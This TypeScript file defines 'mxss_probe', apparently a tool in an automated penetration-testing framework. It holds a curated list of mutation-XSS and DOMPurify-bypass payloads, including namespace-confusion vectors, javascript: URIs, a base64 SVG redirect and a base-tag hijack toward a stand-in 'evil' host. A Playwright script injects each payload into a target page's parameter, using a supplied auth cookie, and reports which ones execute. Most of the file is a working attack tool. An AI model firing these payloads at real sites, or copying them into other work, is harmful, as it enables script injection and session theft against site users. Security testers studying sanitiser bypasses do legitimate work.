// T59 — mxss_probe
// Mutation XSS: curated DOMPurify bypass payloads that survive sanitisation
// then mutate during serialisation/re-parse to execute JS.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const BROWSER_SESSION_URL = 'http://chromium_renderer:3301';

const MXSS_PAYLOADS = [
  // DOMPurify < 2.4.1 namespace confusion
  { name: 'svg_p_id',         payload: '<svg><p id="x"><b id="y"></p></svg><img src=x onerror=alert(1)>', desc: 'SVG namespace confusion (DOMPurify <2.4.1)' },
  // DOMPurify mXSS via math/table
  { name: 'math_table',       payload: '<math><table><tr><td></td></tr></table></math><img src=x onerror=alert(1)>', desc: 'Math+table namespace confusion' },
  // Broken noscript re-parse
  { name: 'noscript_reparse', payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', desc: 'noscript re-parse mutation' },
  // Template tag serialisation
  { name: 'template_inner',   payload: '<template><p>x</p></template><script>alert(1)</script>', desc: 'Template inner HTML re-parse' },
  // Attribute mutation via innerHTML
  { name: 'attr_mutation',    payload: '<p id=\'"><img src=x onerror=alert(1)>', desc: 'Attribute quote mutation' },
  // Form element context confusion
  { name: 'form_action',      payload: '<form action="javascript:alert(1)"><input type=submit>', desc: 'Form action javascript: URI' },
  // SVG animate mutation
  { name: 'svg_animate',      payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', desc: 'SVG animate onbegin handler' },
  // Object/embed mutation
  { name: 'object_data',      payload: '<object data="javascript:alert(1)">', desc: 'Object data javascript: URI' },
  // DOMPurify 3.x MXSS via attribute name with namespace
  { name: 'xlink_href',       payload: '<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJSc+PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZ2VuZXNpcy10ZXN0LmludGVybmFsJzwvc2NyaXB0Pjwvc3ZnPg=="></use></svg>', desc: 'SVG use xlink:href data URI' },
  // details/summary mutation
  { name: 'details_open',     payload: '<details open ontoggle=alert(1)><summary>x</summary></details>', desc: 'Details ontoggle handler' },
  // iframe srcdoc mutation
  { name: 'iframe_srcdoc',    payload: '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>', desc: 'iframe srcdoc inline handler' },
  // Script type mutation
  { name: 'script_type',      payload: '<script type="text/javascript">alert(1)</script>', desc: 'Classic script tag (type= check bypass)' },
  // Meta refresh
  { name: 'meta_refresh',     payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', desc: 'Meta refresh javascript: URI' },
  // Base tag injection
  { name: 'base_inject',      payload: '<base href="https://evil.genesis-test.internal/">', desc: 'Base tag resource hijacking' },
];

const definition: ToolDefinition = {
  name: 'mxss_probe',
  description:
    'Mutation XSS (mXSS) probe. Injects a curated library of mXSS payloads — including DOMPurify bypass ' +
    'vectors — via the target\'s input field. Drives browser_session to confirm JS execution (alert/navigation) ' +
    'after sanitisation+re-parse. Detects cases where HTML sanitisers are defeated by browser mutation during ' +
    'serialisation or namespace confusion.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',          type: 'string', required: true,  description: 'Target page URL' },
    { name: 'inject_field', type: 'string', required: false, description: 'URL parameter or form field name for injection', default: 'q' },
    { name: 'auth_cookie',  type: 'string', required: false, description: 'Auth cookie string' },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Per-test timeout ms', default: 45000 },
  ],
};

export const mxssProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const injectField = String(params.inject_field || 'q');
    const authCookie = params.auth_cookie ? String(params.auth_cookie) : undefined;
    const timeoutMs = Number(params.timeout_ms || 45000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    const script = `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--ignore-certificate-errors'] });
  const context = await browser.newContext({
    ${authCookie ? `extraHTTPHeaders: { 'Cookie': '${authCookie.replace(/'/g, "\\'")}' },` : ''}
    ignoreHTTPSErrors: true,
  });

  const payloads = ${JSON.stringify(MXSS_PAYLOADS)};
  const results = [];
  const baseUrl = '${url.replace(/'/g, "\\'")}';
  const injectField = '${injectField}';

  for (const p of payloads) {
    const page = await context.newPage();
    let dialogFired = false;
    let navigated = false;
    let navigatedUrl = '';

    page.on('dialog', async dialog => {
      dialogFired = true;
      await dialog.dismiss().catch(() => {});
    });
    page.on('framenavigated', frame => {
      if (frame === page.mainFrame()) {
        navigatedUrl = frame.url();
        if (navigatedUrl !== baseUrl && !navigatedUrl.startsWith(baseUrl)) navigated = true;
      }
    });

    const sep = baseUrl.includes('?') ? '&' : '?';
    const testUrl = baseUrl + sep + injectField + '=' + encodeURIComponent(p.payload);
    await page.goto(testUrl, { waitUntil: 'networkidle', timeout: 10000 }).catch(() => {});
    await page.waitForTimeout(1500).catch(() => {});

    const interesting = dialogFired || navigated;
    results.push({ name: p.name, desc: p.desc, dialogFired, navigated, navigatedUrl: navigatedUrl.substring(0, 80), interesting });
    await page.close().catch(() => {});
  }

  await browser.close();
  console.log(JSON.stringify(results));
})().catch(e => { console.error(e.message); process.exit(1); });
`;

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs + 20000);
      const resp = await fetch(`${BROWSER_SESSION_URL}/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ script, timeout: timeoutMs }),
        signal: controller.signal,
      });
      clearTimeout(timer);

      const result = await resp.json() as { stdout?: string; stderr?: string };
      let probeResults: Array<{ name: string; desc: string; dialogFired: boolean; navigated: boolean; interesting: boolean }> = [];
      try { probeResults = JSON.parse(result.stdout || '[]'); } catch { /* ignore */ }

      const interesting = probeResults.filter(r => r.interesting);
      const lines = [
        `mxss_probe — ${MXSS_PAYLOADS.length} mXSS/DOMPurify-bypass payloads on ${url.substring(0, 80)}`,
        `XSS confirmed: ${interesting.length}/${probeResults.length}`,
        '─'.repeat(72),
      ];
      for (const r of probeResults) {
        const flag = r.interesting ? '⚡ XSS CONFIRMED' : '  ·             ';
        const signal = r.dialogFired ? 'alert()' : r.navigated ? 'navigated' : '';
        lines.push(`  ${flag}  [${r.name.padEnd(18)}]  ${signal ? `[${signal}]  ` : ''}${r.desc}`);
      }

      return {
        output: lines.join('\n'),
        parsed: { total: probeResults.length, interesting_count: interesting.length, interesting, results: probeResults },
      };
    } catch (err) {
      return { output: `browser_session error: ${String(err)}`, parsed: { error: String(err) } };
    }
  },
};
